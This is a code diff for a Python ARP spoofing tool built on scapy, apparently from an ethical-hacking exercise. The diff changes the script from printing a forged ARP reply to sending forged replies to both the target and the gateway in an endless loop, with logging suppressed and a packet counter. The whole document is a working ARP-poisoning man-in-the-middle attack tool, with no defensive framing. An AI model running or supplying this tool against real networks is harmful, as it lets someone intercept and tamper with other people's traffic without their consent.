@@ -2,6 +2,8 @@
 
 import scapy.all as scapy
 import optparse
+import time
+import logging
 
 def get_argument():
     parser=optparse.OptionParser()
@@ -23,8 +25,15 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet= scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    print(packet.show())
+    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+    scapy.send(packet, verbose=False)
 
 options = get_argument()
 get_mac(options.ip_tar)
-spoof(options.ip_tar,options.ip_src)
+sent_packet_count = 0
+while True:
+    spoof(options.ip_tar,options.ip_src)
+    spoof(options.ip_src,options.ip_tar)
+    sent_packet_count = sent_packet_count + 2
+    print("\r[+] Packet Sent: " + str(sent_packet_count),end="")
+    time.sleep(2)
